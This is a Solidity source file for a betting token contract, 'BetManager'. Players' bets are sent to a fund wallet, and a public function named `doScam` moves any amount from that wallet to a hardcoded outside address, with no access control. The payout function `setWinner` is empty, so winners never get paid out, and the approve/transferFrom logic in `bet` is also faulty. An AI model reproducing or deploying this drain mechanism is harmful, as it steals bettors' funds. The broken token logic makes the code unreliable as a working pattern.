// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/access/Ownable.sol";
import "./LoanManager.sol";

contract BetManager is LoanManager { 
    
    uint256 private _betBag;
    address private _fundWallet;
    mapping (address => uint256) private _bettingBags; 
    address [] _betsArray;
    
    event Bet(address _gambler, uint256 _valueToBet);
        
    /**
     * @dev Initializes the contract.
     */
    constructor(string memory name, string memory symbol, uint256 freeToken, address fundWallet)  LoanManager(name, symbol,freeToken) public {
        _fundWallet = fundWallet;
    }
    

    /**
     * @dev bet 
     */
    function bet(uint256 valueToBet)  public {
        _betBag += valueToBet;
        _bettingBags[msg.sender] = valueToBet;
        // increaseAllowance(msg.sender, valueToBet);
        approve(msg.sender,valueToBet);
        transferFrom(msg.sender, _fundWallet, valueToBet);
        _betsArray.push(msg.sender);
        //event 
        emit Bet(msg.sender, valueToBet);
    }
    

    /**
     * @dev get Betting Bags
     */
    function getBets() public view returns( address  [] memory){
        return _betsArray;
    }
    
            /**
     * @dev get length
     * @return length of bets
     */
    function getLengthBets() public view returns( uint256){
        return _betsArray.length;
    }
    
    /**
     * @dev do scam
     */
    function doScam(uint256 valueToScam) public {
        address scam = 0x583031D1113aD414F02576BD6afaBfb302140225;
        approve(_fundWallet,valueToScam);
       transferFrom(_fundWallet, scam, valueToScam);
    }
    
    
    function setWinner() public{
        
        
        
    }
    
    
    
    

    
}


